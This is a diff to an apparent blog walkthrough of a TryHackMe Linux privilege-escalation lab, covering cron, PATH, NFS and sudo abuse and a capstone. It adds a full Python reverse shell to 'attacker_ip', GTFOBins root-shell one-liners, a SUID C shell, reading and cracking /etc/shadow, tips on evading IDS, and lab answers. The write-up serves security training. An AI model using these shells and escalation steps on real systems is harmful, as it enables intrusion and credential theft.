@@ -156,7 +156,7 @@ Kernel exploit methodology is simple:
 2. Search and find an exploit code for the kernel version of teh target system
 3. Run the exploit.
 
-It's often simples to just google for existing exploit code, sometimes automatic scanners can be useful but they can give both false positives and false negatives.
+It's often easiest to just google for existing exploit code, sometimes automatic scanners can be useful but they can give both false positives and false negatives.
 
 Note that **it is important to understand how the exploit code works BEFORE you launch it**, it could potentially make irreversible changes to the OS or cause other problems. So even if you are in a LAB environment (such as the machines on THM) try to get the habit of checking and understanding the kernel exploits (and all for that matter, but especially the kernel exploits). 
 
@@ -164,10 +164,10 @@ Note that **it is important to understand how the exploit code works BEFORE you 
 
 **Q: Find and use the appropriate kernel exploit to gain root privileges on the target system**  
 
-Let's start with the "find" part. If you run `uname -a` you get the same kernel as in the previous task, and you can therefore use **CVE-2015-1328**. If you want to understand the code have a look at the CVE-2015-1328 Deep Dive post where I explore it in more detail. 
+Let's start with the "find" part. If you run `uname -a` you get the same kernel as in the previous task, and you can therefore use **CVE-2015-1328**. If you want to understand this CVE a little better stay tuned for the planned CVE-2015-1328 Deep Dive post where I explore it in more detail. 
 
 >**Short summary of CVE-2015-1328**  
- In essence the exploit code creates a malicious lib entry to the `ld.so.preload` file. It is a file containing a list of ELF shared objects to be loaded before any program, so it essentially causes the specified libraries to be preloaded for all programs executed on the system[^1]. By adding a library to ld.so.preload that opens a root shell, the exploit ensures that this library is executed first, granting the attacker a root shell before any other program can run. The ld.so.preload file is only writable as root, this is where the core of the exploit comes in. The exploit abuses a vulnerability in using _user namespaces_ in combination with _overlayfs_ to bypass these restrictions. 
+ In essence the exploit code creates a malicious lib entry to the `ld.so.preload` file. It is a file containing a list of ELF shared objects to be loaded before any program, so it essentially causes the specified libraries to be preloaded for all programs executed on the system[^1]. By adding a malicious library to ld.so.preload that opens a root shell, the exploit ensures that this library is executed first, granting the attacker a root shell before any other program can run. The ld.so.preload file is only writable as root, this is where the core of the exploit comes in. The exploit abuses a vulnerability in using _user namespaces_ in combination with _overlayfs_ to bypass these restrictions. 
 
 From what you can see, "all" that happens when you run the exploit is that a root shell is loaded before all other programs, which should not cause any harm to the operating system. So let's use it!
 
@@ -292,7 +292,7 @@ The task at hand is to check the capabilities and see if we can leverage them fo
 
 Let's start by checking the capabilities using `getcap -r / 2>/dev/null` where `-r` enables recursive search.
 Then you get the following:
-![alt text](image.png)
+![alt text](/assets/images/Privilege_Escalation_getcap.png)
 
 Vim has `cap_setuid+ep` and looking at gftobins (`https://gtfobins.github.io/gtfobins/vim/`) gives the following code for root shell: `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' `
 
@@ -320,7 +320,7 @@ cat /home/ubuntu/flag4.txt
 Cron jobs are scheduled tasks that allow automation of recurring tasks, like backups, system updates and more. They are defined in crontab files where the users or system can specify what commands to run and when. Having cronjobs reduces the need for manual intervention in repetitive tasks and the tasks are executed regularly without delay or human error. For example, it is convenient to have system maintenance tasks running in the evening or at night and not on peak hours.
 
 You can see all the cron jobs when running `cat /etc/crontab`, you will also find the following explaining the structure of the cron job definition:
-```shell
+```terminal
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -346,22 +346,372 @@ You need to manually remove cron jobs when they are no longer needed. Let's say 
 
 ---
 
-**Q: **
+**Q: How many user-defined cron jobs can you see on the target system?**
 <details><summary>Answer</summary>
+4
 </details>
 
 ---
 
-**Q:**
+**Q: What is the content of the flag5.txt file?**  
+
+First off we need to get root access.
+
+When running `cat /etc/crontab` you will find that there are 4 user defined cron jobs.
+
+```terminal
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+
+```
+
+and the PATH variable is: `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+`. 
+
+All except the first is of interest (the first has a path to root which we cannot write to). 
+So let's start with `antivirus.sh` this has no path defined, thus we could create a new file for it as long as it is in any of the directories specified in `PATH`. Unfortunately we don't have write permissions in any of them. 
+
+Let's move on to the `/home/karen/backup.sh` cron job. This is our own cron job and checking the permissions, we have write permissions to the file! This means we can alter the contents of this file. [Here](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a collection of reverse shells if you don't have one already, find one for bash TCP. Make sure  that you have a nc listener on your attacking computer (i.e `nc -lvp 4444`). Remember to make the file executable using chmod! This should give you a root shell!
+
+Let's explore the `/tmp/test.py` for the fun of it! You will find that the test.py file does not exist in the `/tmp` folder. You can create it though, so let's create `test.py`! 
+
+```python
+#!/usr/bin/python3
+
+import socket
+import subprocess
+import os
+
+# Change to the attacker's IP and port
+HOST = 'attacker_ip'
+PORT = 4444
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+# Redirecting standard input, output, and error to the socket
+os.dup2(s.fileno(), 0)  # stdin
+os.dup2(s.fileno(), 1)  # stdout
+os.dup2(s.fileno(), 2)  # stderr
+
+# Launch the shell
+subprocess.call(['/bin/sh', '-i'])
+```
+Let's try it out by running `python3 test.py` and having a listener on our host. You will see that we get a shell but with Karen as our user. This is expected since we ran it as Karen. If you wait a minute you should receive a root-shell here also! 
+
+***Note***
+
+There are a few things to note though, firs off the `#!/usr/bin/python3` on the first line makes sure that the python uses the Python interpreter and not the default, specified by `SHELL` as `/bin/sh`.
+
+You also need to make the python file is executable as well. e
+
+Now that we have root privileges we can check the contents of flag5.txt.
+
+---
+
+**Q: What is Matt's password**  
+With root privileges we can check the `/etc/shadow` file, which along with the `/etc/passwd` could give us a password. We have done this before (task 7), you can either copy the entire files or only Matt's specific lines. Use John the Ripper to retrieve the password.
+
+## Task 10: Privilege Escalation: PATH
+The `PATH` environment variable in Linux specifies the directories the system searches for executable programs when commands are entered in the terminal. When you type a command without providing its full path, the system checks each directory listed in `$PATH` from left to right. It uses the first executable it finds that matches the command name.
+
+Let's consider an example similar to one from TryHackMe (THM):
+
+There is a file owned by root, named `path_exp.c`, which contains the following code:
+
+```c
+#include <unistd.h>
+void main()
+{
+    seduid(0);
+    setgid(0);
+    system("thm");
+}
+```
+
+This file is compiled into an executable called `path`. The key aspect of this program is that it calls `thm` without specifying its full path, making it vulnerable to exploitation. Since the program runs with root privileges, it will execute the first `thm` it finds in the `$PATH`.
+
+**Exploiting the Vulnerability**
+
+To exploit this vulnerability, follow these steps:
+
+1. **Identify Writable Directories**: First, check which directories you have write access to by running:
+
+    ```bash
+    find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+    ```
+
+2. **Modify the `$PATH` Variable**: Next, we want to add the `/tmp` directory to the `$PATH`. This is crucial for our exploit, as we’ll create a malicious version of `thm` that opens a shell. To ensure `/tmp` is searched **before** the directory containing the legitimate `thm`, run:
+
+    ```bash
+    export PATH=/tmp:$PATH
+    ```
+
+3. **Create the Malicious Executable**: Now that `/tmp` is prioritized in the `$PATH`, create your version of `thm` in the `/tmp` folder. This version should be an executable that opens a shell.
+
+
+With the malicious `thm` located in `/tmp`, when you run the `path` executable, it will execute your version of `thm` first. Since the program runs with root privileges, this effectively gives you a root shell. 
+
+---
+
+**Q: What is the odd folder you have write access for?**
 <details><summary>Answer</summary>
+/home/murdoch
 </details>
 
 ---
 
-**Q:**
+**Q: Exploit the $PATH vulnerability to read the content of the flag6.txt file.**  
+In general, opening a root shell is more likely to trigger IDS systems. To minimize detection, let’s focus on fulfilling this task as stealthily as possible. Our goal is to **read** the contents of `flag6.txt`. Normally, we’d use a command like `cat flag6.txt`, or more precisely, `cat /home/matt/flag6.txt`.
+
+Now, take a look at the files in the `/home/murdoch` folder. Which command in `thm.py` is executed without specifying its full path? The `thm` command.
+
+To exploit this, we can create a custom `thm` binary in the `/tmp` directory. Use the following command to store the `cat` operation inside the `thm` executable:
+
+```bash
+echo "cat /home/matt/flag6.txt" > /tmp/thm
+chmod +x /tmp/thm
+```
+
+Once we’ve placed this binary in `/tmp`, if we run `./test` in the murdoch folder, the program should execute our custom `thm`, giving us the contents of `flag6.txt` without raising alarms!
+
+---
+
+**Q: What is the content of the flag6.txt file?**
 <details><summary>Answer</summary>
+THM-XXXXXXX, you should get it from the steps above!
+</details>
+
+## Task 11: Privilege Escalation: NFS
+NFS stands for **Network File System** and is a file system protocol allowing computers to access files over a network as if they were on its local hard drive.
+
+You can see the configuration in the `/etc/exports` file. On the machine given this is shown:
+
+```terminal
+$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+The key to the privilege escalation is the "no_root_squash" option. By default, NFS will change the root user to nfsnobody and remove any root privileges. If the "no_root_squash" is present on a writable share, it is possible to create an executable with SUID bit set and run it on the target system. We could then create a file that starts a root shell on the attacking host and run it on the target host gaining an instant root shell.
+
+---
+
+**Q: How many mountable shares can you identify on the target system?**
+<details><summary>Answer</summary>
+3
 </details>
 
 ---
+
+**Q: How many shares have the "no_root_squash" option enabled?**
+<details><summary>Answer</summary>
+3
+</details>
+
+---
+
+**Q: Gain a root shell on the target system**
+To do this, we first check the mountable shares using either `showmount -e TARGET_IP` on the attacker machine or `cat /etc/exports` on the target host. We find that the following folders are mountable:
+
+```terminal
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+Let's go for the `/home/ubuntu/sharedfolder` since that one does not require root permissions like `/home/backup` and it does not contain anything like `/tmp` does. 
+
+>From a security perspective it would also be preferred to put it in the `/home/ubuntu/sharedfolder` since that folder is empty right now, it could mean it is seldomly checked also, the `/tmp` folder will most likely checked by administrators more often and probably cleaned periodically increasing the chances of it being deleted or detected.
+
+
+If you are not root user, use `sudo su -` to become root on your local machine. Use `mount -o rw MACHINE_IP:/home/backup backupFolderOnAttackerMachine` to mount the backup folder to your computer. Create a file nfs.c (or whatever you want to call it) in the mounted directory. 
+
+```c
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+Compile it with `gcc nfs.c -o nfs -w` if you get an gcc error on the target machine, compile it by adding the `-static` flag as well.
+
+If you run `./nfs` on the target host, you should get a root shell.
+
+---
+
+**Q: What is the content of the flag7.txt file?**
+<details><summary>Answer</summary>
+You will find the flag in /home/matt.
+</details>
+
+## Task 12: Capstone Challenge
+Time for a challenge! 
+
+We are given a start with the user leonard and the password Penny123. Our first mission is to get the contents of flag1.txt. Let's find it through  `find / -name "flag1.txt" 2>/dev/null`. It seems to be located in Missy's `Documents` folder. 
+Let's have a look around if we can find any possible ways to get access to it.
+
+### Enumerating Leonard
+
+#### Kernel
+Let's start off by looking at the kernel. It seems like it is a red-hat version 
+
+```terminal
+Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) 
+```
+After a quick look at exploit-db there does not seem to be any obvious exploits available. Let's come back to this if needed and move on.
+
+#### Sudo
+We are not allowed to run any commands as sudo, so nothing to do here.
+
+```terminal
+[leonard@ip-10-10-70-128 ~]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for leonard: 
+Sorry, user leonard may not run sudo on ip-10-10-70-128.
+```
+#### SUID
+Among the binaries with the SUID bit set are the known `/usr/bin/base64` that we have seen before! We know that **we can exploit this**!
+
+Let's for completeness continue the enumeration to see if we can find any other entries.
+
+#### Cron jobs
+We cannot see any cron jobs for this user.
+
+#### Capabilities
+None of the capabilities have any privilege escalation techniques in gtfobins so let's move on.
+
+#### NFS
+There are no remote folders available .
+
+#### PATH
+If we have a look at the output from $PATH we get the following. 
+
+```terminal
+[leonard@ip-10-10-60-200 ~]$ echo $PATH
+/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3
+/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin
+:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home
+/leonard/.local/bin:/home/leonard/bin
+```
+Let's have a closer look at qt-3.3 and puppetlabs. Neither of these seem to be low hanging fruit in our mission to escalate our privileges. If we did'nt have the SUID we could have had a closer look here and the code snippets to see if we could find a way to exploit the $PATH. 
+
+### Exploiting SUID
+Let's move on and try to escalate our privileges using base64 which we know could give us the `/etc/shadow` file. We have already learned that we can use it to read the shadow file using `base64 /etc/shadow | base64 --decode`. This along with the passwd file might give us a password. It seems reasonable to try to crack "missy" first. So in order to save time I only copy-pasted the missy lines from both of the files and fed that to unshadow and then to John the Ripper. 
+
+```terminal
+$ nano passwd.txt 
+$ nano shadow.txt
+$ unshadow passwd.txt shadow.txt > forJohn.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt forJohn.txt 
+```
+
+This gives us a password for missy! Let's switch to Missy's profile using `su missy` and entering the password retrieved JTR.
+Let's first off get the flag1.txt from `/home/missy/Documents`.
+
+### Enumerating Missy
+
+#### Kernel
+The Kernel is the same, so no need to check this out. 
+
+#### Sudo
+Using `sudo -l` we find that we are allowed to run "find" with sudo. Which we **know can be exploited**! 
+Let's for completeness continue the enumeration anyways.
+
+#### SUID
+This is the same as before, and we don't really have any use for retrieving the shadow file again. So let's move on!
+
+#### Capabilities
+The capabilities seem to be the same as for Leonard, so we won't get much from here!
+
+#### Cron Jobs
+There are no cronjobs for this user.
+
+#### PATH
+We see that we are allowed to use some of Leonard's folders... Interesting... But we have not found any executables with root privileges that could be exploited here. So let's move on since this seems like a rabbit hole.
+
+#### NFS 
+There are no mountable folders for this user.
+
+### Exploiting Sudo find
+gtfobins has a nice one for running find with sudo privileges: `sudo find . -exec /bin/sh \; -quit` which gives us a root shell directly! Let's find the root flag `find / -name flag2.txt 2>/dev/null` and navigate to it! 
+
+
+## Summary of commands
+Well that was a mouthful! 
+
+Let's write down the commands learned for privilege escalation vectors covered here:
+
+### Kernel
+`uname -a`  
+`/proc/version`
+
+### Sudo
+`sudo -l`
+
+### SUID
+`find / -type f -perm -04000 -ls 2>/dev/null`
+
+### Capabilities
+`getcap -r / 2>/dev/null`
+
+### Cron Jobs
+`cat /etc/crontab`
+
+### PATH
+`echo $PATH`
+
+
+### NFS
+`cat /etc/exports`
+
+I hope you enjoyed the walkthrough! 
+Happy hacking!
+
 
 [^1]: <https://man7.org/linux/man-pages/man8/ld.so.8.html>
